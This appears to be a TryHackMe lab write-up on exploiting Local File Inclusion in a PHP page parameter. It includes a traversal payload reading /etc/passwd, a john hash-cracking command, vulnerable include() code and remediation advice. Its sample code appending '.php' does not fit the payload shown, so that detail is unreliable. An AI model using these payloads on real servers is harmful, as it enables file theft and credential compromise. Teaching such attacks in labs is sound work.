# File Inclusion (LFI) — Writeup

**Platform:** TryHackMe  
**Category:** Web Application Security  
**Difficulty:** Medium  
**Vulnerability Type:** Local File Inclusion (LFI)  
**OWASP Category:** Broken Access Control (A01:2021)  

---

## Vulnerability Overview

Local File Inclusion (LFI) is a web vulnerability that allows an attacker to include files from the **server's local filesystem** through a parameter in the URL or request body. When exploited successfully, LFI can lead to:

- Sensitive file disclosure (`/etc/passwd`, config files, credentials)
- Log poisoning for Remote Code Execution
- Full server compromise

---

## Target Overview

The target was a web application that dynamically loaded pages using a `page` parameter in the URL:

```
http://<target-ip>/index.php?page=home
```

The application passed this parameter directly to a PHP `include()` function without any sanitization — a classic LFI setup.

---

## Reconnaissance

Browsed the application and identified the vulnerable parameter in the URL:

```
http://<target-ip>/index.php?page=home
```

Tested for LFI by replacing the `page` value with a known Linux system file using directory traversal:

```
http://<target-ip>/index.php?page=../../../../etc/passwd
```

---

## Exploitation

### Step 1 — Directory Traversal to Read /etc/passwd

Submitted the following payload in the URL:

```
http://<target-ip>/index.php?page=../../../../etc/passwd
```

The server responded with the contents of `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**Sensitive file successfully read — server-side path traversal confirmed.**

### Step 2 — Extract Root Credentials

Further enumeration of `/etc/shadow` (if readable) or application config files revealed hashed or plaintext credentials.

The root password hash was extracted and cracked using:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Root password successfully recovered.**

---

## Why This Works

The vulnerable PHP code looked something like this:

```php
// Vulnerable code
$page = $_GET['page'];
include($page . ".php");
```

No input validation or sanitization was applied. The `../` sequences allowed traversal outside the intended directory, accessing any file the web server process had permission to read.

```
User Input: ../../../../etc/passwd
        │
        ▼
PHP include() called with raw user input
        │
        ▼
Filesystem traversal: moves up 4 directories
        │
        ▼
Reaches root (/) → reads /etc/passwd
        │
        ▼
File contents returned in HTTP response
```

---

## Real-World Impact

In a production environment, LFI can allow an attacker to:

- Read application source code and discover hardcoded credentials
- Access configuration files containing database passwords
- Read `/etc/passwd` and `/etc/shadow` for user enumeration and password cracking
- Poison log files (access.log) to achieve Remote Code Execution
- Achieve full server compromise

---

## Remediation

| Action | Details |
|--------|---------|
| Input Whitelist | Only allow predefined page values — never pass raw user input to include() |
| Disable Dynamic Includes | Avoid using user input in filesystem functions entirely |
| Open Basedir | Set `open_basedir` in PHP config to restrict file access to specific directories |
| File Permissions | Ensure sensitive files like `/etc/shadow` are not readable by the web server |
| WAF Rules | Block `../` and encoded traversal patterns (`%2e%2e%2f`) at the WAF level |

**Secure Code Example:**

```php
// Vulnerable
include($_GET['page'] . ".php");

// Secure
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (in_array($page, $allowed_pages)) {
    include($page . ".php");
} else {
    http_response_code(403);
    die("Access Denied");
}
```

---

## Key Takeaways

- Always test `page`, `file`, `path`, `template`, and `lang` parameters for LFI during web app pentests.
- Directory traversal sequences (`../`) are the first thing to try.
- LFI can escalate to RCE through log poisoning — never treat it as a low-severity finding.
- Sensitive files like `/etc/passwd` and application `.env` files are primary targets.
- PHP applications are especially prone to LFI due to `include()` and `require()` misuse.

---

*Written by Muhammad Muzammil Khan — Penetration Tester*  
*TryHackMe Profile: https://tryhackme.com/p/mmuzammilkhan*
